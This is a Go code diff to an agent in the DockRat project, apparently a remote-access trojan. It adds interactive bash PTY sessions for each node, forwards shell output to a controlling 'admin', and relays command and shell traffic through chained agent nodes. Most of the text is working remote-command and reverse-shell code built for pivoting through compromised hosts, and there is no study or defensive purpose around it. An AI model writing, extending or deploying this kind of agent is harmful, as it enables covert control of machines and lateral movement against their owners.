@@ -5,8 +5,11 @@ import (
 	"io"
 	"log"
 	"net"
+	"os"
 	"os/exec"
 	"strings"
+
+	"golang.org/x/term"
 
 	"github.com/Singert/DockRat/core/common"
 	"github.com/Singert/DockRat/core/node"
@@ -14,8 +17,13 @@ import (
 	"github.com/creack/pty"
 )
 
-var shellStarted = false
-var shellStdin io.WriteCloser
+type ShellSession struct {
+	Stdin   io.WriteCloser
+	Started bool
+}
+
+const BasicAgentID = -100 // 默认Basic模式固定伪ID
+var shellSessionMap = make(map[int]*ShellSession)
 
 // ✅ 统一入口：默认 agent 启动模式
 func StartBasicAgent(conn net.Conn) {
@@ -28,9 +36,10 @@ func StartBasicAgent(conn net.Conn) {
 
 		switch msg.Type {
 		case protocol.MsgCommand:
-			handleCommand(msg, conn)
+			handleCommand(msg, conn, nil)
 		case protocol.MsgShell:
-			handleShellPTY(msg, conn)
+
+			handleShellPTY(msg, conn, nil, BasicAgentID)
 		case protocol.MsgStartRelay:
 			// 🔁 动态转为 relay 模式
 			handleStartRelay(msg, conn)
@@ -51,9 +60,9 @@ func StartRelayAgent(conn net.Conn, ctx *RelayContext) {
 		}
 		switch msg.Type {
 		case protocol.MsgCommand:
-			handleCommand(msg, conn)
+			handleCommand(msg, conn, ctx)
 		case protocol.MsgShell:
-			handleShellPTY(msg, conn)
+			handleShellPTY(msg, conn, ctx, ctx.SelfID)
 		case protocol.MsgRelayPacket:
 			var pkt protocol.RelayPacket
 			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
@@ -104,7 +113,10 @@ func handleStartRelay(msg protocol.Message, conn net.Conn) {
 	resp := protocol.Message{Type: protocol.MsgRelayReady, Payload: data}
 	buf, _ := protocol.EncodeMessage(resp)
 	conn.Write(buf)
-	StartRelayAgent(conn, ctx)
+
+	go StartRelayAgent(conn, ctx) // 用于处理 admin 向 relay 发来的控制命令
+
+	select {}
 }
 
 // ✅ 读取一个消息帧
@@ -122,7 +134,7 @@ func readMessageFromConn(conn net.Conn) (protocol.Message, error) {
 }
 
 // ✅ 命令执行处理
-func handleCommand(msg protocol.Message, conn net.Conn) {
+func handleCommand(msg protocol.Message, conn net.Conn, ctx *RelayContext) {
 	var payload map[string]string
 	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
 		log.Println("[-] Command unmarshal error:", err)
@@ -137,48 +149,106 @@ func handleCommand(msg protocol.Message, conn net.Conn) {
 	}
 
 	resp := protocol.Message{Type: protocol.MsgResponse, Payload: output}
-	data, _ := protocol.EncodeMessage(resp)
-	conn.Write(data)
+
+	if ctx != nil {
+		RelayUpward(ctx, resp)
+	} else {
+		data, _ := protocol.EncodeMessage(resp)
+		conn.Write(data)
+	}
 }
 
-// ✅ shell 模式处理（支持远程交互）
-func handleShellPTY(msg protocol.Message, conn net.Conn) {
+func handleShellPTY(msg protocol.Message, conn net.Conn, ctx *RelayContext, nodeID int) {
 	line := string(msg.Payload)
+	log.Printf("[Shell] Received shell input from admin: %q (node %d)", line, nodeID)
 
-	if !shellStarted {
-		cmd := exec.Command("/bin/sh")
+	// 获取或初始化会话
+	session, exists := shellSessionMap[nodeID]
+	if !exists {
+		cmd := exec.Command("bash", "--norc", "--noprofile") // ✅ 更真实的交互环境
+		cmd.Env = append(os.Environ(), "TERM=xterm")         // ✅ 加强兼容性
+
 		ptmx, err := pty.Start(cmd)
 		if err != nil {
 			log.Println("[-] Failed to start pty:", err)
 			return
 		}
-		shellStarted = true
-		shellStdin = ptmx
+		if _, err := term.MakeRaw(int(ptmx.Fd())); err != nil {
+			log.Println("[-] Failed to set PTY raw mode:", err)
+		}
+		session = &ShellSession{
+			Stdin:   ptmx,
+			Started: true,
+		}
+		shellSessionMap[nodeID] = session
 
+		// ✅ 启动 goroutine 读取 shell 输出
 		go func() {
 			buf := make([]byte, 1024)
 			for {
 				n, err := ptmx.Read(buf)
 				if err != nil {
-					log.Println("[-] Shell read error:", err)
+					log.Printf("[-] Shell session for node %d read error: %v", nodeID, err)
 					return
 				}
+				if n == 0 {
+					continue
+				}
+				payload := buf[:n]
+				log.Printf("[Shell] Read %d bytes from PTY for node %d: %q", n, nodeID, payload)
+
 				msg := protocol.Message{
 					Type:    protocol.MsgShell,
-					Payload: buf[:n],
+					Payload: payload,
 				}
-				data, _ := protocol.EncodeMessage(msg)
-				conn.Write(data)
+
+				if ctx != nil && nodeID != ctx.SelfID {
+					log.Printf("[Shell] Relaying shell output upward from node %d", nodeID)
+					RelayUpward(ctx, msg)
+				} else {
+					data, _ := protocol.EncodeMessage(msg)
+					conn.Write(data)
+				}
 			}
 		}()
-		return
 	}
 
+	// 写入 shell 命令
 	if !strings.HasSuffix(line, "\n") {
 		line += "\n"
 	}
-	_, err := shellStdin.Write([]byte(line))
+	_, err := session.Stdin.Write([]byte(line))
 	if err != nil {
-		log.Println("[-] Write to shell error:", err)
+		log.Printf("[-] Write to shell session %d failed: %v", nodeID, err)
+	}
+}
+
+func FindNodeIDByConn(reg *node.Registry, conn net.Conn) int {
+	for _, n := range reg.List() {
+		if n.Conn == conn {
+			return n.ID
+		}
+	}
+	return -1
+}
+func StartBasicAgentWithID(conn net.Conn, ctx *RelayContext, nodeID int) {
+	for {
+		msg, err := readMessageFromConn(conn)
+		if err != nil {
+			log.Printf("[-] Agent connection closed: %v", err)
+			return
+		}
+
+		switch msg.Type {
+		case protocol.MsgCommand:
+			handleCommand(msg, conn, ctx)
+		case protocol.MsgShell:
+			handleShellPTY(msg, conn, ctx, nodeID) // ✅ 用 relay 分配的真实 ID
+		case protocol.MsgStartRelay:
+			handleStartRelay(msg, conn)
+			return
+		default:
+			log.Printf("[-] Unknown or unsupported message: %s", msg.Type)
+		}
 	}
 }
